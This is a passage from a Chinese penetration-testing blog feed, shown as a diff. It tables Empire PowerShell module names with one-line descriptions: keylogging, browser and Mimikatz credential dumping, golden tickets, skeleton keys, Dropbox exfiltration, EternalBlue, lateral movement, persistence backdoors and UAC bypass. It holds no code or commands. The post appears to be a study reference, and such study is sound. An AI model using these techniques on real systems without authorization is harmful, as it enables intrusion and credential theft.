+<td>collection/ChromeDump</td>
+<td>收集chrome浏览器保存的密码和浏览历史记录</td>
+</tr>
+<tr>
+<td>collection/FoxDump</td>
+<td>收集Firefox浏览器保存的密码和浏览历史记录</td>
+</tr>
+<tr>
+<td>collection/USBKeylogger*</td>
+<td>利用ETW作为键盘记录</td>
+</tr>
+<tr>
+<td>collection/WebcamRecorder</td>
+<td>从摄像头捕获视频</td>
+</tr>
+<tr>
+<td>collection/browser_data</td>
+<td>搜索浏览器历史记录或书签</td>
+</tr>
+<tr>
+<td>collection/clipboard_monitor</td>
+<td>按指定的时间间隔监视剪贴板</td>
+</tr>
+<tr>
+<td>collection/file_finder</td>
+<td>查找域中的敏感文件</td>
+</tr>
+<tr>
+<td>collection/find_interesting_file</td>
+<td>查找域中的敏感文件</td>
+</tr>
+<tr>
+<td>collection/get_indexed_item</td>
+<td>获取Windows desktop search索引文件</td>
+</tr>
+<tr>
+<td>collection/get_sql_column_sample_data</td>
+<td>从目标SQL Server返回列信息。</td>
+</tr>
+<tr>
+<td>collection/get_sql_query</td>
+<td>在目标SQL服务器上执行查询</td>
+</tr>
+<tr>
+<td>collection/inveigh</td>
+<td>Windows PowerShell LLMNR/mDNS/NBNS中间人工具</td>
+</tr>
+<tr>
+<td>collection/keylogger</td>
+<td>键盘记录到keystrokes.txt文件中，文件位置/downloads/agentname/keystrokes.txt/agentname</td>
+</tr>
+<tr>
+<td>collection/minidump</td>
+<td>进程的全内存转储，PowerSploit的Out-Minidump.ps1</td>
+</tr>
+<tr>
+<td>collection/netripper</td>
+<td>将NetRipper注入目标进程，该进程使用API挂钩以拦截来自低特权用户的网络流量和与加密相关的功能，从而能够在加密之前/解密之后捕获纯文本流量和加密流量。</td>
+</tr>
+<tr>
+<td>collection/ninjacopy*</td>
+<td>通过读取原始卷并解析NTFS结构，从NTFS分区卷中复制文件。</td>
+</tr>
+<tr>
+<td>collection/packet_capture*</td>
+<td>使用netsh在主机上启动数据包捕获。</td>
+</tr>
+<tr>
+<td>collection/prompt</td>
+<td>提示当前用户在表单框中输入其凭据，然后返回结果。</td>
+</tr>
+<tr>
+<td>collection/screenshot</td>
+<td>屏幕截图</td>
+</tr>
+<tr>
+<td>collection/vaults/add_keepass_config_trigger</td>
+<td>寻找KeePass配置</td>
+</tr>
+<tr>
+<td>collection/vaults/find_keepass_config</td>
+<td>此模块查找并解析KeePass.config.xml (2.X)和KeePass.config.xml (1.X)文件。</td>
+</tr>
+<tr>
+<td>collection/vaults/get_keepass_config_trigger</td>
+<td>该模块从KeePass 2.X配置XML文件中提取触发器说明</td>
+</tr>
+<tr>
+<td>collection/vaults/keethief</td>
+<td>此模块检索未锁定的KeePass数据库的database mastey key信息</td>
+</tr>
+<tr>
+<td>collection/vaults/remove_keepass_config_trigger</td>
+<td>该模块从Find-KeePassConfig找到的所有KeePass配置中删除所有触发器</td>
+</tr>
+</tbody></table>
+<h4 id="credentials身份凭证"><a href="#credentials身份凭证" class="headerlink" title="credentials身份凭证"></a>credentials身份凭证</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwdv0P.png" alt="dwdv0P.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>credentials/credential_injection*</td>
+<td>运行PowerSploit的Invoke-CredentialInjection创建具有明文凭证的登录，而不会触发事件ID 4648使用显式凭据尝试登录</td>
+</tr>
+<tr>
+<td>credentials/enum_cred_store</td>
+<td>从Windows凭据管理器中转储当前交互用户的纯文本凭据</td>
+</tr>
+<tr>
+<td>credentials/invoke_kerberoast</td>
+<td>为具有非空服务主体名称（SPN）的所有用户请求kerberos票据，并将其提取为John或Hashcat可用格式</td>
+</tr>
+<tr>
+<td>credentials/powerdump*</td>
+<td>使用Posh-SecMod的Invoke-PowerDump从本地系统中转储哈希</td>
+</tr>
+<tr>
+<td>credentials/sessiongopher</td>
+<td>提取WinSCP已保存的会话和密码</td>
+</tr>
+<tr>
+<td>credentials/tokens</td>
+<td>运行PowerSploit的Invoke-TokenManipulation枚举可用的登录令牌，并使用它们创建新的进程</td>
+</tr>
+<tr>
+<td>credentials/vault_credential*</td>
+<td>运行PowerSploit的Get-VaultCredential以显示Windows Vault凭证对象，包括明文Web凭证</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/cache*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数以提取MSCache(v2) hashes</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/certs*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数将所有证书提取到本地目录</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/command*</td>
+<td>使用自定义命令运行PowerSploit的Invoke-Mimikatz函数</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/dcsync</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数，以通过Mimikatz的lsadump::dcsync模块提取给定的帐户密码</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/dcsync_hashdump</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数，以使用Mimikatz的lsadump::dcsync模块收集所有域哈希</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/extract_tickets</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数，以base64编码形式从内存中提取kerberos票据</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/golden_ticket</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数以生成黄金票据并将其注入内存</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/keys*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数以将所有密钥提取到本地目录</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/logonpasswords*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取纯文本凭据。</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/lsadump*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取特定的用户哈希。 在域控制器上很有用。</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/mimitokens*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数以列出或枚举令牌。</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/pth*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数以执行sekurlsa::pth来创建一个新进程。</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/purge</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数从内存中清除所有当前的kerberos票据</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/sam*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数从安全帐户管理器（SAM）数据库中提取哈希</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/silver_ticket</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数，以生成服务器/服务的白银票据并将其注入内存。</td>
+</tr>
+<tr>
+<td>credentials/mimikatz/trust_keys*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数，从域控制器中提取域信任密钥。</td>
+</tr>
+</tbody></table>
+<h4 id="exfiltration数据窃取"><a href="#exfiltration数据窃取" class="headerlink" title="exfiltration数据窃取"></a>exfiltration数据窃取</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwwptS.png" alt="dwwptS.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>exfiltration/egresscheck</td>
+<td>可用于帮助检查主机与客户端系统之间的出口，详细信息：<a href="https://github.com/stufus/egresscheck-framework" target="_blank" rel="noopener">https://github.com/stufus/egresscheck-framework</a></td>
+</tr>
+<tr>
+<td>exfiltration/exfil_dropbox</td>
+<td>下载文件到dropbox</td>
+</tr>
+</tbody></table>
+<h4 id="exploitation漏洞利用"><a href="#exploitation漏洞利用" class="headerlink" title="exploitation漏洞利用"></a>exploitation漏洞利用</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwwmkT.png" alt="dwwmkT.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>exploitation/exploit_eternalblue</td>
+<td>MS17_010永恒之蓝漏洞利用</td>
+</tr>
+<tr>
+<td>exploitation/exploit_jboss</td>
+<td>Jboss漏洞利用</td>
+</tr>
+<tr>
+<td>exploitation/exploit_jenkins</td>
+<td>在未授权访问的Jenkins脚本控制台上运行命令</td>
+</tr>
+</tbody></table>
+<h4 id="lateral-movement横向移动"><a href="#lateral-movement横向移动" class="headerlink" title="lateral_movement横向移动"></a>lateral_movement横向移动</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0AtZ6.png" alt="d0AtZ6.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>lateral_movement/inveigh_relay</td>
+<td>smb中继攻击</td>
+</tr>
+<tr>
+<td>lateral_movement/invoke_dcom</td>
+<td>使用DCOM在远程主机上执行stager</td>
+</tr>
+<tr>
+<td>lateral_movement/invoke_executemsbuild</td>
+<td>该模块利用WMI和MSBuild编译并执行一个包含Empire launcher的xml文件。</td>
+</tr>
+<tr>
+<td>lateral_movement/invoke_psexec</td>
+<td>PsExec横向移动</td>
+</tr>
+<tr>
+<td>lateral_movement/invoke_psremoting</td>
+<td>远程PowerShell横向移动</td>
+</tr>
+<tr>
+<td>lateral_movement/invoke_smbexec</td>
+<td>SMBExec横向移动</td>
+</tr>
+<tr>
+<td>lateral_movement/invoke_sqloscmd</td>
+<td>利用xp_cmdshell横向移动</td>
+</tr>
+<tr>
+<td>lateral_movement/invoke_sshcommand</td>
+<td>利用SSH横向移动</td>
+</tr>
+<tr>
+<td>lateral_movement/invoke_wmi</td>
+<td>利用WMI横向移动</td>
+</tr>
+<tr>
+<td>lateral_movement/invoke_wmi_debugger</td>
+<td>使用WMI将远程机器上的二进制文件的调试器设置为cmd.exe或stager</td>
+</tr>
+<tr>
+<td>lateral_movement/jenkins_script_console</td>
+<td>利用未授权访问的Jenkins脚本控制台横向移动</td>
+</tr>
+<tr>
+<td>lateral_movement/new_gpo_immediate_task</td>
+<td>利用GPO中的计划任务横向移动</td>
+</tr>
+</tbody></table>
+<h4 id="management管理"><a href="#management管理" class="headerlink" title="management管理"></a>management管理</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0eiT0.png" alt="d0eiT0.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>management/enable_rdp*</td>
+<td>在远程计算机上启用RDP并添加防火墙例外。</td>
+</tr>
+<tr>
+<td>management/disable_rdp*</td>
+<td>在远程计算机上禁用RDP</td>
+</tr>
+<tr>
+<td>management/downgrade_account</td>
+<td>在给定的域帐户上设置可逆加密，然后强制下次用户登录时设置密码。</td>
+</tr>
+<tr>
+<td>management/enable_multi_rdp*</td>
+<td>允许多个用户建立同时的RDP连接。</td>
+</tr>
+<tr>
+<td>management/get_domain_sid</td>
+<td>返回当前指定域的SID</td>
+</tr>
+<tr>
+<td>management/honeyhash*</td>
+<td>将人工凭证注入到LSASS</td>
+</tr>
+<tr>
+<td>management/invoke_script</td>
+<td>运行自定义脚本</td>
+</tr>
+<tr>
+<td>management/lock</td>
+<td>锁定工作站的显示</td>
+</tr>
+<tr>
+<td>management/logoff</td>
+<td>从计算机上注销当前用户（或所有用户）</td>
+</tr>
+<tr>
+<td>management/psinject</td>
+<td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td>
+</tr>
+<tr>
+<td>management/reflective_inject</td>
+<td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td>
+</tr>
+<tr>
+<td>management/restart</td>
+<td>重新启动指定的机器</td>
+</tr>
+<tr>
+<td>management/runas</td>
+<td>绕过GPO路径限制</td>
+</tr>
+<tr>
+<td>management/shinject</td>
+<td>将PIC Shellcode Payload注入目标进程</td>
+</tr>
+<tr>
+<td>management/sid_to_user</td>
+<td>将指定的域sid转换为用户</td>
+</tr>
+<tr>
+<td>management/spawn</td>
+<td>在新的powershell.exe进程中生成新agent</td>
+</tr>
+<tr>
+<td>management/spawnas</td>
+<td>使用指定的登录凭据生成agent</td>
+</tr>
+<tr>
+<td>management/switch_listener</td>
+<td>切换listener</td>
+</tr>
+<tr>
+<td>management/timestomp</td>
+<td>通过’调用Set-MacAttribute执行类似耗时的功能</td>
+</tr>
+<tr>
+<td>management/user_to_sid</td>
+<td>将指定的domain\user转换为domain sid</td>
+</tr>
+<tr>
+<td>management/vnc</td>
+<td>Invoke-Vnc在内存中执行VNC代理并启动反向连接</td>
+</tr>
+<tr>
+<td>management/wdigest_downgrade*</td>
+<td>将计算机上的wdigest设置为使用显式凭据</td>
+</tr>
+<tr>
+<td>management/zipfolder</td>
+<td>压缩目标文件夹以供以后渗透</td>
+</tr>
+<tr>
+<td>management/mailraider/disable_security</td>
+<td>此函数检查ObjectModelGuard</td>
+</tr>
+<tr>
+<td>management/mailraider/get_emailitems</td>
+<td>返回指定文件夹的所有项目</td>
+</tr>
+<tr>
+<td>management/mailraider/get_subfolders</td>
+<td>返回指定顶级文件夹中所有文件夹的列表</td>
+</tr>
+<tr>
+<td>management/mailraider/mail_search</td>
+<td>在给定的Outlook文件夹中搜索项目</td>
+</tr>
+<tr>
+<td>management/mailraider/search_gal</td>
+<td>返回与指定搜索条件匹配的所有exchange users</td>
+</tr>
+<tr>
+<td>management/mailraider/send_mail</td>
+<td>使用自定义或默认模板将电子邮件发送到指定地址。</td>
+</tr>
+<tr>
+<td>management/mailraider/view_email</td>
+<td>选择指定的文件夹，然后在指定的索引处输出电子邮件项目</td>
+</tr>
+</tbody></table>
+<h4 id="persistence持久化"><a href="#persistence持久化" class="headerlink" title="persistence持久化"></a>persistence持久化</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0eKmR.png" alt="d0eKmR.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>persistence/elevated/registry*</td>
+<td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td>
+</tr>
+<tr>
+<td>persistence/elevated/schtasks*</td>
+<td>计划任务持久化</td>
+</tr>
+<tr>
+<td>persistence/elevated/wmi*</td>
+<td>WMI事件订阅持久化</td>
+</tr>
+<tr>
+<td>persistence/elevated/wmi_updater*</td>
+<td>WMI订阅持久化</td>
+</tr>
+<tr>
+<td>persistence/misc/add_netuser</td>
+<td>将域用户或本地用户添加到当前（或远程）计算机</td>
+</tr>
+<tr>
+<td>persistence/misc/add_sid_history*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::addsid以添加用户的sid历史记录。 仅适用于域控制器</td>
+</tr>
+<tr>
+<td>persistence/misc/debugger*</td>
+<td>将指定目标二进制文件的调试器设置为cmd.exe</td>
+</tr>
+<tr>
+<td>persistence/misc/disable_machine_acct_change*</td>
+<td>禁止目标系统的机器帐户自动更改其密码</td>
+</tr>
+<tr>
+<td>persistence/misc/get_ssps</td>
+<td>枚举所有已加载的安全软件包</td>
+</tr>
+<tr>
+<td>persistence/misc/install_ssp*</td>
+<td>安装安全支持提供程序dll</td>
+</tr>
+<tr>
+<td>persistence/misc/memssp*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::memssp，将所有身份验证事件记录到C:\Windows\System32\mimisla.log</td>
+</tr>
+<tr>
+<td>persistence/misc/skeleton_key*</td>
+<td>运行PowerSploit的Invoke-Mimikatz函数来执行misc::skeleton，植入密码mimikatz的万能钥匙。 仅适用于域控制器</td>
+</tr>
+<tr>
+<td>persistence/powerbreach/deaduser</td>
+<td>DeadUserBackdoor后门，详细信息：<a href="http://www.sixdub.net/?p=535" target="_blank" rel="noopener">http://www.sixdub.net/?p=535</a></td>
+</tr>
+<tr>
+<td>persistence/powerbreach/eventlog*</td>
+<td>启动事件循环后门</td>
+</tr>
+<tr>
+<td>persistence/powerbreach/resolver</td>
+<td>启动解析器后门</td>
+</tr>
+<tr>
+<td>persistence/userland/backdoor_lnk</td>
+<td>LNK文件后门</td>
+</tr>
+<tr>
+<td>persistence/userland/registry</td>
+<td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td>
+</tr>
+<tr>
+<td>persistence/userland/schtasks</td>
+<td>计划任务持久化</td>
+</tr>
+</tbody></table>
+<h4 id="privesc权限提升"><a href="#privesc权限提升" class="headerlink" title="privesc权限提升"></a>privesc权限提升</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0e1k6.png" alt="d0e1k6.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>privesc/ask</td>
+<td>弹出一个对话框，询问用户是否要以管理员身份运行powershell</td>
+</tr>
+<tr>
+<td>privesc/bypassuac</td>
+<td>UAC bypass</td>
+</tr>
+<tr>
+<td>privesc/bypassuac_env</td>
+<td>UAC bypass</td>
+</tr>
+<tr>
+<td>privesc/bypassuac_eventvwr</td>
+<td>UAC bypass</td>
+</tr>
+<tr>
+<td>privesc/bypassuac_fodhelper</td>
+<td>UAC bypass</td>
+</tr>
+<tr>
+<td>privesc/bypassuac_sdctlbypass</td>
+<td>UAC bypass</td>
+</tr>
+<tr>
+<td>privesc/bypassuac_tokenmanipulation</td>
+<td>UAC bypass</td>
+</tr>
+<tr>
+<td>privesc/bypassuac_wscript</td>
+<td>UAC bypass</td>
+</tr>
+<tr>
+<td>privesc/getsystem*</td>
+<td>获取system特权</td>
+</tr>
+<tr>
+<td>privesc/gpp</td>
+<td>利用windows组策略首选项缺陷获取系统帐号</td>
+</tr>
+<tr>
+<td>privesc/mcafee_sitelist</td>
+<td>寻找McAfee SiteList.xml文件的纯文本密码</td>
+</tr>
+<tr>
+<td>privesc/ms16-032</td>
+<td>MS16-032本地提权</td>
+</tr>
+<tr>
+<td>privesc/ms16-135</td>
+<td>MS16-135本地提权</td>
+</tr>
+<tr>
+<td>privesc/tater</td>
+<td>利用PowerShell实现的Hot Potato提权</td>
+</tr>
+<tr>
+<td>privesc/powerup/allchecks</td>
+<td>检查目标主机的攻击向量以进行权限提升</td>
+</tr>
+<tr>
+<td>privesc/powerup/find_dllhijack</td>
+<td>查找通用的.DLL劫持</td>
+</tr>
+<tr>
+<td>privesc/powerup/service_exe_restore</td>
+<td>还原备份的服务二进制文件</td>
+</tr>
+<tr>
+<td>privesc/powerup/service_exe_stager</td>
+<td>备份服务的二进制文件，并用启动stager.bat的二进制文件替换原始文件</td>
+</tr>
+<tr>
+<td>privesc/powerup/service_exe_useradd</td>
+<td>修改目标服务以创建本地用户并将其添加到本地管理员</td>
+</tr>
+<tr>
+<td>privesc/powerup/service_stager</td>
+<td>修改目标服务以执行Empire stager</td>
+</tr>
+<tr>
+<td>privesc/powerup/service_useradd</td>
+<td>修改目标服务以创建本地用户并将其添加到本地管理员</td>
+</tr>
+<tr>
+<td>privesc/powerup/write_dllhijacker</td>
+<td>将可劫持的.dll以及.dll调用的stager.bat一起写到指定路径。 wlbsctrl.dll在Windows 7上运行良好。需要重新启动计算机</td>
+</tr>
+</tbody></table>
+<h4 id="recon侦察"><a href="#recon侦察" class="headerlink" title="recon侦察"></a>recon侦察</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0et6H.png" alt="d0et6H.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>recon/find_fruit</td>
+<td>在网络范围内搜索潜在的易受攻击的Web服务</td>
+</tr>
+<tr>
+<td>recon/get_sql_server_login_default_pw</td>
+<td>发现在当前广播域之内的SQL Server实例</td>
+</tr>
+<tr>
+<td>recon/http_login</td>
+<td>针对基本身份验证测试凭据</td>
+</tr>
+</tbody></table>
+<h4 id="situational-awareness态势感知"><a href="#situational-awareness态势感知" class="headerlink" title="situational_awareness态势感知"></a>situational_awareness态势感知</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0ew7t.png" alt="d0ew7t.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>situational_awareness/host/antivirusproduct</td>
+<td>获取防病毒产品信息</td>
+</tr>
+<tr>
+<td>situational_awareness/host/computerdetails*</td>
+<td>枚举有关系统的有用信息</td>
+</tr>
+<tr>
+<td>situational_awareness/host/dnsserver</td>
+<td>枚举系统使用的DNS服务器</td>
+</tr>
+<tr>
+<td>situational_awareness/host/findtrusteddocuments</td>
+<td>该模块将枚举适当的注册表</td>
+</tr>
+<tr>
+<td>situational_awareness/host/get_pathacl</td>
+<td>枚举给定文件路径的ACL</td>
+</tr>
+<tr>
+<td>situational_awareness/host/get_proxy</td>
+<td>枚举当前用户的代理服务器和WPAD内容</td>
+</tr>
+<tr>
+<td>situational_awareness/host/get_uaclevel</td>
+<td>枚举UAC级别</td>
+</tr>
+<tr>
+<td>situational_awareness/host/monitortcpconnections</td>
+<td>监视主机与指定域名或IPv4地址的TCP连接，对于会话劫持和查找与敏感服务进行交互的用户很有用</td>
+</tr>
+<tr>
+<td>situational_awareness/host/paranoia*</td>
+<td>持续检查运行过程中是否存在可疑用户</td>
+</tr>
+<tr>
+<td>situational_awareness/host/winenum</td>
+<td>收集有关主机和当前用户上下文的相关信息</td>
+</tr>
+<tr>
+<td>situational_awareness/network/arpscan</td>
+<td>针对给定范围的IPv4 IP地址执行ARP扫描</td>
+</tr>
+<tr>
+<td>situational_awareness/network/bloodhound</td>
+<td>执行BloodHound数据收集</td>
+</tr>
+<tr>
+<td>situational_awareness/network/get_exploitable_system</td>
+<td>查询Active Directory以查找可能容易受到Metasploit Exploit的系统</td>
+</tr>
+<tr>
+<td>situational_awareness/network/get_spn</td>
+<td>获取服务主体名称（SPN）</td>
+</tr>
+<tr>
+<td>situational_awareness/network/get_sql_instance_domain</td>
+<td>返回SQL Server实例列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/get_sql_server_info</td>
+<td>从目标SQL Server返回基本服务器和用户信息</td>
+</tr>
+<tr>
+<td>situational_awareness/network/portscan</td>
+<td>使用常规套接字进行简单的端口扫描</td>
+</tr>
+<tr>
+<td>situational_awareness/network/reverse_dns</td>
+<td>执行给定IPv4 IP范围的DNS反向查找</td>
+</tr>
+<tr>
+<td>situational_awareness/network/smbautobrute</td>
+<td>针对用户名/密码列表运行SMB暴力破解</td>
+</tr>
+<tr>
+<td>situational_awareness/network/smbscanner</td>
+<td>在多台机器上测试用户名/密码组合</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/find_foreign_group</td>
+<td>枚举给定域的组的所有成员，并查找不在查询域中的用户</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/find_foreign_user</td>
+<td>枚举在其主域之外的组中的用户</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/find_gpo_computer_admin</td>
+<td>获取计算机（或GPO）对象，并确定哪些用户/组对该对象具有管理访问权限</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/find_gpo_location</td>
+<td>获取用户名或组名，并确定其具有通过GPO进行管理访问的计算机</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/find_localadmin_access</td>
+<td>在当前用户具有“本地管理员”访问权限的本地域上查找计算机</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/find_managed_security_group</td>
+<td>此功能检索域中的所有安全组</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_cached_rdpconnection</td>
+<td>使用远程注册表功能来查询计算机上“ Windows远程桌面连接客户端”的所有信息</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_computer</td>
+<td>查询当前计算机对象的域</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_dfs_share</td>
+<td>返回给定域的所有容错分布式文件系统的列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_domain_controller</td>
+<td>返回当前域或指定域的域控制器</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_domain_policy</td>
+<td>返回给定域或域控制器的默认域或DC策略</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_domain_trust</td>
+<td>返回当前域或指定域的所有域信任</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_fileserver</td>
+<td>返回从用户主目录提取的所有文件服务器的列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_forest</td>
+<td>返回有关给定域森林的信息</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_forest_domain</td>
+<td>返回给定林的所有域</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_gpo</td>
+<td>获取域中所有当前GPO的列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_group</td>
+<td>获取域中所有当前组的列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_group_member</td>
+<td>返回给定组的成员</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_localgroup</td>
+<td>返回本地或远程计算机上指定本地组中所有当前用户的列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_loggedon</td>
+<td>执行NetWkstaUserEnum Win32API调用以查询主动登录主机的用户</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_object_acl</td>
+<td>返回与特定活动目录对象关联的ACL</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_ou</td>
+<td>获取域中所有当前OU的列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_rdp_session</td>
+<td>在给定的RDP远程服务中查询活动会话和原始IP</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_session</td>
+<td>执行NetSessionEnum Win32API调用以查询主机上的活动会话</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_site</td>
+<td>获取域中所有当前站点的列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_subnet</td>
+<td>获取域中所有当前子网的列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/get_user</td>
+<td>查询给定用户或指定域中用户的信息</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/map_domain_trust</td>
+<td>使用.CSV输出映射所有可访问的域信任</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/process_hunter</td>
+<td>查询远程机器的进程列表</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/set_ad_object</td>
+<td>使用SID，名称或SamAccountName来查询指定的域对象</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/share_finder</td>
+<td>在域中的计算机上查找共享</td>
+</tr>
+<tr>
+<td>situational_awareness/network/powerview/user_hunter</td>
+<td>查找指定组的用户登录的机器</td>
+</tr>
+</tbody></table>
+<h4 id="trollsploit恶作剧"><a href="#trollsploit恶作剧" class="headerlink" title="trollsploit恶作剧"></a>trollsploit恶作剧</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0egXj.png" alt="d0egXj.png"></p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>trollsploit/get_schwifty</td>
+<td>播放Schwifty视频，同时把计算机音量设置最大</td>
+</tr>
+<tr>
+<td>trollsploit/message</td>
+<td>发送一个消息框</td>
+</tr>
+<tr>
+<td>trollsploit/process_killer</td>
+<td>终止以特定名称开头的任何进程</td>
+</tr>
+<tr>
+<td>trollsploit/rick_ascii</td>
+<td>生成一个新的powershell.exe进程运行Lee Holmes’ ASCII Rick Roll</td>
+</tr>
+<tr>
+<td>trollsploit/rick_astley</td>
+<td>运行SadProcessor’s beeping rickroll</td>
+</tr>
+<tr>
+<td>trollsploit/thunderstruck</td>
+<td>播放Thunderstruck视频，同时把计算机音量设置最大</td>
+</tr>
+<tr>
+<td>trollsploit/voicetroll</td>
+<td>通过目标上的合成语音朗读文本</td>
+</tr>
+<tr>
+<td>trollsploit/wallpaper</td>
+<td>将.jpg图片上传到目标机器并将其设置为桌面壁纸</td>
+</tr>
+<tr>
+<td>trollsploit/wlmdr</td>
+<td>在任务栏中显示气球提示</td>
+</tr>
+</tbody></table>
+<h1 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h1><p><strong>这个暂停，等开学后在更新</strong></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>powershell</tag>
+        <tag>nishang</tag>
+        <tag>powersploit</tag>
+        <tag>empire</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记一次以DLL程序作后门的样本分析</title>
     <url>/2020/07/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5DLL%E7%A8%8B%E5%BA%8F%E4%BD%9C%E5%90%8E%E9%97%A8%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近快被自己懒哭了，自从这学期结束后这段时间里感觉全都在玩，但实际也没玩的痛快，时间倒是过的挺快，不行，我最近得调整一下。</p>
